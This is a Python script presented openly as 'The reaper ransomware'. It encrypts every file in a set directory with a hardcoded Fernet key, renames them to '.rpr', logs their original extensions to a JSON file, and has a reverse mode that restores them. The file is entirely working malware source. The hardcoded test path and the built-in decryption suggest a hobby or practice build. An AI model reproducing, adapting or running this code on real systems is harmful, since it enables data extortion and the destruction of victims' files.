# The reaper ransomware 8========D
from cryptography.fernet import Fernet
import os
import sys
import json

banner = """
 /$$$$$$$                                                   
| $$__  $$                                                  
| $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
| $$$$$$$/ /$$__  $$ |____  $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$__  $$| $$$$$$$$  /$$$$$$$| $$  \ $$| $$$$$$$$| $$  \__/
| $$  \ $$| $$_____/ /$$__  $$| $$  | $$| $$_____/| $$      
| $$  | $$|  $$$$$$$|  $$$$$$$| $$$$$$$/|  $$$$$$$| $$      
|__/  |__/ \_______/ \_______/| $$____/  \_______/|__/      
                              | $$                          
                              | $$                          
                              |__/                          
"""

# Variables
DIR = "C:/Users/krist/Documents/ran_test"

# The file rewriting class
class TakeOver():
  def __init__(self,f):
    print(banner)
    # Encrypt file
    self.key = b"5sj-M2aX4rfmXd3GDoCJv9u-3Rtfvlz2BZpctmfdx6Q="
    self.fernet = Fernet(self.key) 
    # Loop through the files in the given dir
    self.file_data = {}
    for i in f:
      PATH = f"{DIR}/{i}"
      # Get file content
      o_f = open(PATH,"rb")
      content = o_f.read()
      o_f.close()
      # Change file ext
      ext = '.' + os.path.realpath(PATH).split('.')[-1:][0]
      if ext == ".rpr":
        print("Files are already encrypted, quitting...")
        sys.exit()
      self.rpr_file = i.replace(ext, '.rpr')
      ENC_FILE = f"{DIR}/{self.rpr_file}"
      os.rename(PATH,  ENC_FILE)
      # Encrypt content of the file
      file = open(ENC_FILE, 'wb')
      file.write(self.fernet.encrypt(content))
      file.close()
      # Noting the encrypted files in a json format
      self.file_data[str(ENC_FILE)] = ext
      with open('ext.json', 'w') as a:
        json.dump(self.file_data, a)
    print("Files are now encrypted, the REAPER has done its job.")

# Decrypt files
class TakeBack():
  def __init__(self):
    # Get encryption key
    self.key = b"5sj-M2aX4rfmXd3GDoCJv9u-3Rtfvlz2BZpctmfdx6Q="
    self.fernet = Fernet(self.key)
    with open("ext.json") as files:
      self.ENC_FILES = json.load(files)
    for i in self.ENC_FILES:
      # Put old extension back to the file
      ext = '.' + os.path.realpath(i).split('.')[-1:][0]
      if ext != ".rpr":
        print("Files are not encrypted, quitting.")
        sys.exit()
      self.o_file = i.replace(ext, f'{self.ENC_FILES[i]}')
      # Get file content
      o_f = open(i, "rb")
      content = o_f.read()
      o_f.close()
      # Decrypt the content of the file
      file = open(self.o_file, 'wb')
      file.write(self.fernet.decrypt(content))
      file.close()
      #remove encrypted files
      os.remove(i)
    print("Files are back to normal, REAPER is quitting...")
    os.remove("ext.json")
      
if sys.argv[1] == "-t":
  REAPER = TakeOver(os.listdir(DIR))
elif sys.argv[1] == "-r":
  TAKER = TakeBack()
else:
  print("Wrong parameters...")
  sys.exit()
